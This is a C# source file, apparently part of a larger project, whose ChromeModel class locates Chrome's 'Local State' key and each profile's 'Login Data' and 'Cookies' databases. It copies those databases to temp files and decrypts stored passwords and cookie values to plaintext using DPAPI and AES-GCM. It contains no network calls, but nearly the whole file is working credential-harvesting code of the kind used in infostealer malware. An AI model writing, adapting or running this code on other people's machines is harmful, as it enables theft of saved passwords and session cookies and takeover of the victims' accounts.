#define USE_System_Data_Sqlite

using System;
#if USE_System_Data_Sqlite
using System.Data.SQLite;
#endif
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Linq;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class ChromeModel
    {
        public static string GetAppDataLocalPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        }

        public static string GetAppDataRoamingPath()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        public string UserDataPath { get; set; }

        private string _enckey = null;
        public string EncKey
        {
            get
            {
                if (_enckey == null)
                {
                    try
                    {
                        //string encKey = File.ReadAllText(Path.Combine(GetLocalAppDataPath(), @"Google\Chrome\User Data\Local State"));
                        string encKey = File.ReadAllText(Path.Combine(UserDataPath, @"Local State"));
                        _enckey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
                    }
                    catch
                    {
                    }
                }
                return _enckey;
            }
        }

        public ChromeModel(string userDataPath)
        {
            this.UserDataPath = userDataPath;
        }

#if USE_System_Data_Sqlite
        public IEnumerable<PassModel> ReadPasswordProfile(string profileName, string logindataPath, string host = null)
        {
            var result = new List<PassModel>();
            if (File.Exists(logindataPath))
            {
                String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string target = APPDATA_PATH + @"\tempc";
                if (File.Exists(target))
                    File.Delete(target);
                File.Copy(logindataPath, target);
                using (var conn = new SQLiteConnection($"Data Source={target};"))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    try
                                    {
                                        String url = reader.GetString(0);
                                        String user = reader.GetString(1);
                                        if (host != null && url != host) continue;
                                        String pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                        if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                                        {
                                            result.Add(new PassModel()
                                            {
                                                Url = url,
                                                Profile = profileName,
                                                Username = user,
                                                Password = pass
                                            });
                                        }
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            String url = reader.GetString(0);
                                            String user = reader.GetString(1);
                                            if (host != null && url != host) continue;
                                            var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                                            var pass = _decryptWithKey(GetBytes(reader, 2), decodedKey, 3);
                                            if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                                            {
                                                result.Add(new PassModel()
                                                {
                                                    Url = url,
                                                    Profile = profileName,
                                                    Username = user,
                                                    Password = pass
                                                });
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    conn.Close();
                }
                if (File.Exists(target))
                    File.Delete(target);
            }
            return result;
        }

        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
#else
        public IEnumerable<PassModel> ReadPasswordProfile(string profileName, string logindataPath, string host = null)
        {
            var result = new List<PassModel>();
            if (File.Exists(logindataPath))
            {
                String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string target = APPDATA_PATH + @"\tempc";
                if (File.Exists(target))
                    File.Delete(target);
                File.Copy(logindataPath, target);
                SQLiteHandler SQLDatabase = new SQLiteHandler(target);
                if (SQLDatabase.ReadTable("logins"))
                {
                    int totalEntries = SQLDatabase.GetRowCount();
                    for (int i = 0; i < totalEntries; i++)
                    {
                        try
                        {
                            String url = SQLDatabase.GetValue(i, "origin_url");
                            if (host != null && url != host) continue;
                            String user = SQLDatabase.GetValue(i, "username_value");
                            String pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));
                            if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                            {
                                result.Add(new PassModel()
                                {
                                    Url = url,
                                    Profile = profileName,
                                    Username = user,
                                    Password = pass
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            //Console.WriteLine($"Failed in {profileName} : " + ex.Message);
                        }
                    }
                }
                if (File.Exists(target))
                    File.Delete(target);
            }
            return result;
        }

        private string Decrypt(string encryptedText)
        {
            if (encryptedText == null || encryptedText.Length == 0)
            {
                return null;
            }
            byte[] encryptedData = System.Text.Encoding.Default.GetBytes(encryptedText);
            try
            {
                byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(decryptedData);
            }
            catch
            {
                var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                var plainText = _decryptWithKey(encryptedData, decodedKey, 3);
                return plainText;
            }

        }
#endif

        public IEnumerable<PassModel> ReadPassword(string host = null)
        {
            var result = new List<PassModel>();
            try
            {
                List<String> profileList = new List<string>
                {
                    "Default"
                };
                DirectoryInfo dInfo = new DirectoryInfo(UserDataPath);
                DirectoryInfo[] dInfoArray = dInfo.GetDirectories("Profile *", SearchOption.TopDirectoryOnly);
                foreach (DirectoryInfo d in dInfoArray)
                {
                    profileList.Add(d.Name);
                }
                foreach (String profileName in profileList)
                {
                    String profilePath = $"{UserDataPath}\\{profileName}\\Login Data";
                    result.AddRange(ReadPasswordProfile(profileName, profilePath, host));
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Failed : {UserDataPath} : " + ex.Message);
            }
            return result;
        }

        public IEnumerable<Cookie> ReadCookieProfile(String profileName, String cookiePath, String host)
        {
            var result = new List<Cookie>();
            if (File.Exists(cookiePath))
            {
                try
                {
                    String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    string target = APPDATA_PATH + @"\tempe";
                    if (File.Exists(target))
                        File.Delete(target);
                    File.Copy(cookiePath, target);
                    using (var conn = new SQLiteConnection($"Data Source={target};pooling=false"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            if (host == null)
                            {
                                cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies";
                            }
                            else
                            {
                                var prm = cmd.CreateParameter();
                                prm.ParameterName = "hostName";
                                prm.Value = host;
                                cmd.Parameters.Add(prm);
                                cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies WHERE host_key = @hostName";
                            }
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        var encryptedData = (byte[])reader[2];
                                        var s = Encoding.ASCII.GetString(encryptedData);
                                        try
                                        {
                                            var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                                            var plainText = Encoding.ASCII.GetString(decodedData); // Looks like ASCII
                                            result.Add(new Cookie()
                                            {
                                                Profile = profileName,
                                                Url = reader.GetString(0),
                                                Name = reader.GetString(1),
                                                Value = plainText
                                            });
                                        }
                                        catch
                                        {
                                            try
                                            {
                                                var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                                                var plainText = _decryptWithKey(encryptedData, decodedKey, 3);
                                                result.Add(new Cookie()
                                                {
                                                    Profile = profileName,
                                                    Url = reader.GetString(0),
                                                    Name = reader.GetString(1),
                                                    Value = plainText
                                                });
                                            }
                                            catch (Exception ex)
                                            {
                                                Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }
                    if (File.Exists(target))
                        File.Delete(target);
                }
                catch (Exception ex)
                {
                    //Console.WriteLine($"Failed in {profileName} : " + ex.Message);
                }
            }
            return result;
        }

        public IEnumerable<Cookie> ReadCookie(String host, String filename = "Cookies")
        {
            var result = new List<Cookie>();
            try
            {
                List<String> profileList = new List<string>();
                profileList.Add("Default");
                DirectoryInfo dInfo = new DirectoryInfo(UserDataPath);
                DirectoryInfo[] dInfoArray = dInfo.GetDirectories("Profile *", SearchOption.TopDirectoryOnly);
                foreach (DirectoryInfo d in dInfoArray)
                {
                    profileList.Add(d.Name);
                }
                foreach (String profileName in profileList)
                {
                    String profilePath = $"{UserDataPath}\\{profileName}\\{filename}";
                    result.AddRange(ReadCookieProfile(profileName, profilePath, host));
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Failed : {UserDataPath} : " + ex.Message);
            }
            return result;
        }

        private string _decryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException(String.Format("Key needs to be {0} bit!", KEY_BIT_SIZE), "key");
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }

    }

}
